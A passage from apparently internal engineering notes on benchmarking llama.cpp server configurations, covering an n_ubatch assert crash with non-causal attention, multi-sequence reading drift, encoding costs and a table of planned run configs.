   **Half answered:** the crash is the `n_ubatch` assert (`llama-context.cpp:1898`, non-causal attention only), so it is a llama.cpp limitation — the unfinished half of `b11577`, `split_seq` keeps one full sequence per ubatch — not a Jetson artifact and not a `/v1/systemone` bug.
   `d1-3B` (causal) has now been probed with `--only envelope` and did not crash at all, as predicted.
   **Still to test:** whether `-ub 2048` removes it for the d3 family — `./run_model.sh d3flash-ub2048-p2` records the ceiling, the envelope and the merge case under that config.
9. Does the multi-sequence fix change **readings** (not just latency)?
   `probe.py --only multiseq` on each model; if alone-vs-batched drift exceeds ~0.05, the calibration corpus must be run in the shipped batch shape.
10. Is the `1 choice x4 options` encoding still cheaper than `4 noul` on the new build (it was 0.48 s vs 1.30 s on b11606), and does it change any reading?
    `probe.py --only encoding_equivalence,multiseq`.
    On `d1-3B` at `--parallel 2`: 0.204 s / 221 tok vs 0.604 s / 727 tok, and the `choice` answer came back `intent` at confidence 0.598 — the encodings differ in what they ask, not only in cost.
11. **The config matrix (next runs).**
    The model alone does not decide multi-question behaviour; the server flags do.
    `bench/run_model.sh` now pins five configs (model + `--parallel` + `-b`/`-ub` + `-c`), prints the `llama-server` command for each (no ssh key for `jetson` from this machine), and refuses to record a run whose model / build / slot count / reported `n_ubatch` disagree:

    | config              | model           | `--parallel` | `-ub` | what it decides                                                             |
    | ------------------- | --------------- | ------------ | ----- | --------------------------------------------------------------------------- |
    | `d1-p2`             | `d1-3B`         | 2            | 512   | **done** — sharing fires, group size 2, `usage` blind to it                 |
    | `d1-p4`             | `d1-3B`         | 4            | 512   | 4 questions in one group: one state read, latency toward one question       |
    | `d3flash-ub2048-p2` | `vllm-d3-flash` | 2            | 2048  | does `-ub 2048` remove the assert, and do N questions then share one ubatch |
    | `d3flash-ub2048-p1` | `vllm-d3-flash` | 1            | 2048  | control: no merging, so no assert                                           |
    | `d3mini-ub2048-p2`  | `vllm-d3-mini`  | 2            | 2048  | same as flash, cheaper model                                                |

    `d1-p4` is the run that answers the Jev question for the current pick: predicted 3/4 tasks inheriting the prefix and the 4-question latency falling toward a single question's.
